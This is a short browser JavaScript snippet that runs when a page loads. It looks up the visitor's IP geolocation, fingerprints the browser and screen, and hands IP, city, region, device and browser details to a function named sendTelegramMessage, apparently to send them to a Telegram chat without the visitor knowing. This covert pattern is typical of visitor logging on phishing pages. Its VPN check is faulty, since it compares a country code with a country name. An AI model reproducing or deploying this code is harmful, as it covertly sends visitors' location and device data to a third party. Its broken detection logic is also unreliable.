window.addEventListener("load", async () => {
  const res = await fetch("https://ipapi.co/json/");
  const ipInfo = await res.json();

  const fingerprint = `${navigator.userAgent}-${screen.width}x${screen.height}`;
  const isVPN = ipInfo.org?.toLowerCase().includes("vpn") || ipInfo.country !== ipInfo.country_name;

  const data = {
    fingerprint,
    ip: ipInfo.ip,
    country: ipInfo.country_name,
    region: ipInfo.region,
    city: ipInfo.city,
    device: navigator.platform,
    browser: navigator.userAgent,
    vpn: isVPN ? "🔒 VPN/Proxy Detected" : "✅ No VPN"
  };

  sendTelegramMessage(data);
});
